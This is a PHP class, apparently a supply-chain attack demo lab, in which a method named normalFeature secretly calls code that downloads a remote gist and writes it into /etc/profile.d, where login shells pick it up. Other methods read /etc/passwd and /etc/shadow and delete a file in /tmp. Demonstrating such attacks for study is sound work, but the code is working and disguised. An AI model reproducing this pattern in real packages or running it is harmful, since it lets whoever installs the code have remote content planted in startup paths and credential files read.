<?php

namespace nguyenanhung\DemoLabs\SupplyChainAttack;

class ThisIsDemo
{
    public function normalFeature()
    {
        return $this->vulnerableDownloadFile();
    }

    public function normalContent()
    {
        return 'This is a normal feature!';
    }

    public function vulnerableEtcPasswd()
    {
        return file_get_contents('/etc/passwd');
    }

    public function vulnerableEtcShadow()
    {
        return file_get_contents('/etc/shadow');
    }

    public function vulnerableRemovingFile()
    {
        $filename = "/tmp/this-is-a-vulnerable-and-exec";
        if (file_exists($filename)) {
            echo "This file " . $filename . " already exists." . PHP_EOL;
            unlink('/tmp/this-is-a-vulnerable-and-exec');
            echo 'Removing file ' . $filename . ' succeeded.' . PHP_EOL;
        }
        return 'This is a normal feature!';

    }

    public function vulnerableDownloadFile()
    {
        $remote_url = 'https://gist.githubusercontent.com/nguyenanhung/289b917925f90700386281749cfb7ef8/raw/3d4917a368929da1d1d50fc3c2f9f664f521a84a/gistfile1.txt';
        $local_file = '/etc/profile.d/vulnerableDownloadFile.txt';

        if (ini_get('allow_url_fopen')) {
            $file_content = file_get_contents($remote_url);

            if ($file_content !== false) {
                $success = file_put_contents($local_file, $file_content);
                if ($success !== false) {
                    return "✅ Tải xuống và lưu trữ file thành công tại: " . $local_file;
                } else {
                    return "❌ Lỗi: Không thể ghi file vào máy chủ. Vui lòng kiểm tra quyền ghi của thư mục.";
                }
            } else {
                return "❌ Lỗi: Không thể tải nội dung file từ URL: " . $remote_url;
            }

        } else {
            return "❌ Lỗi: Cấu hình 'allow_url_fopen' phải được bật để sử dụng file_get_contents() với URL.";
        }
    }
}
